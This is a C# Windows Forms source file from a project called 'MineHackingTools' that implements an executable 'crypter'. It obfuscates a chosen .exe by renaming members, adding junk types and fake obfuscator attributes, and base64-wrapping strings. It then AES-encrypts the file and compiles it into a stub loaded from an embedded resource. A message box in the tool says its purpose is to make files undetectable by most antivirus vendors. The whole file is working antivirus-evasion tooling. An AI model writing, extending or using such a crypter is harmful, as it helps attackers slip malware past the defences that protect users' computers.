using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Reflection;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using CryptoPrivacy;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using dnlib;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace MineHackingTools
{
    public partial class CryptorObfoucastionForm : Form
    {
        public CryptorObfoucastionForm()
        {
            InitializeComponent();
        }

        private void AddCrypterToListView(string Crypter, string IsItMadeByMe)
        {
            ListViewItem ToColumns = new ListViewItem(Crypter);
            ToColumns.SubItems.Add(IsItMadeByMe);
            listView1.Items.Add(ToColumns);
        }

        private void CryptorObfoucastionForm_Load(object sender, EventArgs e)
        {
            AddCrypterToListView("MineCryptor", "True");
        }

        public string RandomPassword(int PasswordLength)
        {
            StringBuilder MakePassword = new StringBuilder();
            Random MakeRandom = new Random();
            while (0 < PasswordLength--)
            {
                string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ*!@=&?&/abcdefghijklmnopqrstuvwxyz1234567890";
                MakePassword.Append(characters[MakeRandom.Next(characters.Length)]);
            }
            return MakePassword.ToString();
        }

        public string RandomName(int NameLength)
        {
            StringBuilder MakePassword = new StringBuilder();
            Random MakeRandom = new Random();
            while (0 < NameLength--)
            {
                string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                MakePassword.Append(characters[MakeRandom.Next(characters.Length)]);
            }
            return MakePassword.ToString();
        }

        private void ObfuscasteCode(string ToProtect)
        {
            ModuleContext ModuleCont = ModuleDefMD.CreateModuleContext();
            ModuleDefMD FileModule = ModuleDefMD.Load(ToProtect, ModuleCont);
            for (int i = 200; i < 300; i++)
            {
                InterfaceImpl Interface = new InterfaceImplUser(FileModule.GlobalType);
                TypeDef typedef = new TypeDefUser("", $"Form{i.ToString()}", FileModule.CorLibTypes.GetTypeRef("System", "Attribute"));
                InterfaceImpl interface1 = new InterfaceImplUser(typedef);
                FileModule.Types.Add(typedef);
                typedef.Interfaces.Add(interface1);
                typedef.Interfaces.Add(Interface);
            }

            string[] FakeObfuscastionsAttributes = { "ConfusedByAttribute", "YanoAttribute", "NetGuard", "DotfuscatorAttribute", "BabelAttribute" };

            for (int i = 0; i < FakeObfuscastionsAttributes.Length; i++)
            {
                var FakeObfuscastionsAttribute = new TypeDefUser(FakeObfuscastionsAttributes[i], FileModule.CorLibTypes.Object.TypeDefOrRef);
                FileModule.Types.Add(FakeObfuscastionsAttribute);
            }

            foreach (TypeDef type in FileModule.Types)
            {
                FileModule.Name = RandomName(12);
                if (type.IsGlobalModuleType || type.IsRuntimeSpecialName || type.IsSpecialName || type.IsWindowsRuntime || type.IsInterface)
                {
                    continue;
                }
                else
                {
                    for (int i = 200; i < 300; i++)
                    {
                        foreach (PropertyDef property in type.Properties)
                        {
                            if (property.IsRuntimeSpecialName) continue;
                            property.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                        foreach (FieldDef fields in type.Fields)
                        {
                            fields.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                        foreach (EventDef eventdef in type.Events)
                        {
                            eventdef.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.IsConstructor || method.IsRuntimeSpecialName || method.IsRuntime || method.IsStaticConstructor || method.IsVirtual) continue;
                            method.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                    }
                }
            }

            foreach (TypeDef type in FileModule.Types)
            {
                foreach (MethodDef GetMethods in type.Methods)
                {
                    for (int i = 200; i < 300; i++)
                    {
                        if (GetMethods.IsConstructor || GetMethods.IsRuntimeSpecialName || GetMethods.IsRuntime || GetMethods.IsStaticConstructor) continue;
                        GetMethods.Name = RandomName(15) + i;
                    }
                }
            }

            for (int i = 0; i < 200; i++)
            {
                var Junk = new TypeDefUser(RandomName(10) + i + RandomName(10) + i + RandomName(10) + i, FileModule.CorLibTypes.Object.TypeDefOrRef);
                FileModule.Types.Add(Junk);
            }

            for (int i = 0; i < 200; i++)
            {
                var Junk = new TypeDefUser(i.ToString() + RandomName(12) + i + RandomName(15) + i + RandomName(14) + i + RandomName(17) + i, FileModule.CorLibTypes.Object.TypeDefOrRef);
                var Junk2 = new TypeDefUser(RandomName(16) + i + RandomName(10) + i + RandomName(16) + i + RandomName(20) + i, FileModule.CorLibTypes.Object.Namespace);
                var Junk3 = new TypeDefUser("a".ToString() + RandomName(16) + i + RandomName(10) + i + RandomName(16) + i + RandomName(20) + i, FileModule.CorLibTypes.Object.Namespace);
                FileModule.Types.Add(Junk);
                FileModule.Types.Add(Junk2);
                FileModule.Types.Add(Junk3);
            }

            foreach (TypeDef type in FileModule.Types)
            {
                foreach (MethodDef Methods in type.Methods)
                {
                    if (Methods.Body == null) continue;
                    Methods.Body.SimplifyBranches();
                    for (int i = 0; i < Methods.Body.Instructions.Count; i++)
                    {
                        if (Methods.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                        {
                            string EncodedString = Methods.Body.Instructions[i].Operand.ToString();
                            string InsertEncodedString = Convert.ToBase64String(UTF8Encoding.UTF8.GetBytes(EncodedString));
                            Methods.Body.Instructions[i].OpCode = OpCodes.Nop;
                            Methods.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, FileModule.Import(typeof(Encoding).GetMethod("get_UTF8", new Type[] { }))));
                            Methods.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, InsertEncodedString));
                            Methods.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, FileModule.Import(typeof(Convert).GetMethod("FromBase64String", new Type[] { typeof(string) }))));
                            Methods.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, FileModule.Import(typeof(Encoding).GetMethod("GetString", new Type[] { typeof(byte[]) }))));
                            i += 4;
                        }
                    }
                }
            }
            FileModule.Write(Environment.CurrentDirectory + @"\Obfuscasted.exe");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (ListViewItem IsAnythingSelected in listView1.SelectedItems)
                {
                    if (checkBox1.Checked == true)
                    {
                        if (IsAnythingSelected.Text == null)
                        {
                            MessageBox.Show("Please choose a cryptor.", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                        }
                        else
                        {
                            File.Copy(textBox1.Text, Environment.CurrentDirectory + @"\Obfuscaste.exe");
                            ObfuscasteCode(Environment.CurrentDirectory + @"\Obfuscaste.exe");
                            Task.Delay(1000).Wait();
                            var Options = new Dictionary<string, string>();
                            Options.Add("CompilerVersion", "v4.0");
                            Options.Add("language", "c#");
                            var codeProvider = new CSharpCodeProvider(Options);
                            CompilerParameters parameters = new CompilerParameters();
                            parameters.CompilerOptions = "/target:winexe";
                            parameters.GenerateExecutable = true;
                            string RandomNameForExecutable = RandomName(12);
                            parameters.OutputAssembly = Environment.CurrentDirectory + @"\" + RandomNameForExecutable + ".exe";
                            parameters.IncludeDebugInformation = false;
                            string[] Librarys = { "System", "System.Windows.Forms", "System.Management", "System.Net", "System.Core", "System.Net.Http", "System.Runtime", "System.Runtime.InteropServices" };
                            foreach (string Library in Librarys)
                            {
                                parameters.ReferencedAssemblies.Add(Library + ".dll");
                            }
                            AesAlgorithms Encryption = new AesAlgorithms();
                            foreach (ListViewItem SelectedCrypter in listView1.SelectedItems)
                            {
                                switch (SelectedCrypter.Text)
                                {
                                    case "MineCryptor":
                                        byte[] CodeToProtect = File.ReadAllBytes(Environment.CurrentDirectory + @"\Obfuscasted.exe");
                                        string RandomIV = RandomPassword(16);
                                        string RandomKey = RandomPassword(40);
                                        string Final = Encryption.AesTextEncryption(Convert.ToBase64String(CodeToProtect), RandomKey, RandomIV);
                                        string MineCryptorCode = Resource1.MineCryptor;
                                        string NewCrypterCode = MineCryptorCode.Replace("LLXls", Final).Replace("XOSa", RandomKey).Replace("OIXAS", RandomIV).Replace("FrzXRrIAvCIqEha", "namespace " + RandomName(14));
                                        codeProvider.CompileAssemblyFromSource(parameters, NewCrypterCode);
                                        File.Delete(Environment.CurrentDirectory + @"\Obfuscaste.exe");
                                        Task.Delay(500).Wait();
                                        File.Delete(Environment.CurrentDirectory + @"\Obfuscasted.exe");
                                        File.Move(Environment.CurrentDirectory + @"\" + RandomNameForExecutable + ".exe", Environment.CurrentDirectory + @"\Crypted.exe");
                                        Task.Delay(500).Wait();
                                        MessageBox.Show("Done\nthe file are saved to: " + Environment.CurrentDirectory + @"\Crypted.exe", "Success", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
                                        break;
                                }
                            }
                        }
                    }
                    else
                    {
                        var Options = new Dictionary<string, string>();
                        Options.Add("CompilerVersion", "v4.0");
                        Options.Add("language", "c#");
                        var codeProvider = new CSharpCodeProvider(Options);
                        CompilerParameters parameters = new CompilerParameters();
                        parameters.CompilerOptions = "/target:winexe";
                        parameters.GenerateExecutable = true;
                        string RandomNameForExecutable = RandomName(12);
                        parameters.OutputAssembly = Environment.CurrentDirectory + @"\" + RandomNameForExecutable + ".exe";
                        parameters.IncludeDebugInformation = false;
                        string[] Librarys = { "System", "System.Windows.Forms", "System.Management", "System.Net", "System.Core", "System.Net.Http", "System.Runtime", "System.Runtime.InteropServices" };
                        foreach (string Library in Librarys)
                        {
                            parameters.ReferencedAssemblies.Add(Library + ".dll");
                        }
                        AesAlgorithms Encryption = new AesAlgorithms();
                        foreach (ListViewItem SelectedCrypter in listView1.SelectedItems)
                        {
                            switch (SelectedCrypter.Text)
                            {
                                case "MineCryptor":
                                    byte[] CodeToProtect = File.ReadAllBytes(textBox1.Text);
                                    string RandomIV = RandomPassword(16);
                                    string RandomKey = RandomPassword(40);
                                    string Final = Encryption.AesTextEncryption(Convert.ToBase64String(CodeToProtect), RandomKey, RandomIV);
                                    string MineCryptorCode = Resource1.MineCryptor;
                                    string NewCrypterCode = MineCryptorCode.Replace("LLXls", Final).Replace("XOSa", RandomKey).Replace("OIXAS", RandomIV).Replace("FrzXRrIAvCIqEha", "namespace " + RandomName(14));
                                    codeProvider.CompileAssemblyFromSource(parameters, NewCrypterCode);
                                    Task.Delay(500).Wait();
                                    File.Move(Environment.CurrentDirectory + @"\" + RandomNameForExecutable + ".exe", Environment.CurrentDirectory + @"\Crypted.exe");
                                    Task.Delay(500).Wait();
                                    break;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog GetFileToCrypt = new OpenFileDialog();
            GetFileToCrypt.Filter = "Executable Files (*.exe) | *.exe";
            GetFileToCrypt.Title = "File To Crypt";
            if(GetFileToCrypt.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = GetFileToCrypt.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("These Cryptors are just to make it undetectable for most AV Vendors, and it's not designed to be hard to unpack.", "Note", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
        }
    }
}
